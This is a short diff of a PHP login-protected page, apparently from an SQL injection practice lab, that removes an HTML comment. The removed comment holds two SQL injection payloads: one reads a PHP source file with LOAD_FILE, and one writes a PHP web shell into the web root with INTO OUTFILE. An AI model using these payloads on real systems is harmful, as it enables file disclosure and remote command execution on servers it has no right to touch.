@@ -1,11 +1,3 @@
-<!-- 
- 
-' UNION SELECT 1, LOAD_FILE('/opt/lampp/htdocs/sqlinj/index.php'), 3, 4 -- - 
-stringa casuale' UNION SELECT "", '<!?php system($_GET[0]); ?>', "", "" INTO OUTFILE '/opt/lampp/htdocs/sqlinj/shell.php' -- - 
-
--->
-
-
 <?php 
     session_start();
     if(!isset($_SESSION["acceduto"])){
